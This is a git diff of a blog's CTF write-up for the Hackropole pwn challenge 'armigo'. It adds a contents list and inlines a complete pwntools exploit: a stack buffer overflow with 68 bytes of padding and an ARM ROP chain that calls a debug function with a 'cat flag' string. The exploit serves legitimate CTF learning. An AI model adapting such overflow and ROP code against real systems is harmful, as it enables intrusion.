@@ -4,6 +4,10 @@ title = "Hackropole | Armigo"
 
 # [Pwn] armigo | hackropole
 
+* [1. Checksec](#checksec)
+* [2. Writeup](#writeup)
+* [3. Full exploit](#full-exploit)
+
 ## Checksec
 
 ```bash
@@ -52,6 +56,25 @@ and here we go, we got the flag
 
 ![flag](/images/armigo/flag.png)
 
-full exploit [here](/armigo/exploits/armigo.py)
+## Full exploit
+
+```python
+from pwn import *
+
+def exploit(io, elf, libc=None):
+    padding = b"A"*68 
+    pop = 0x000703c8 # pop {r0, lr}; bx lr;
+    cat_flag = 0x000733fc # "cat flag"
+    debug = 0x000104d8
+
+    payload = padding + p32(pop) + p32(cat_flag) + p32(debug)
+
+    io.sendlineafter(b'?\n', payload)
+    io.recvline()
+    flag = io.recvline().decode('utf-8')
+    io.success(f'flag: {flag}')
+
+```
+[download here](/exploits/armigo.py)
 
 **Writed by 0xB0tm4n**
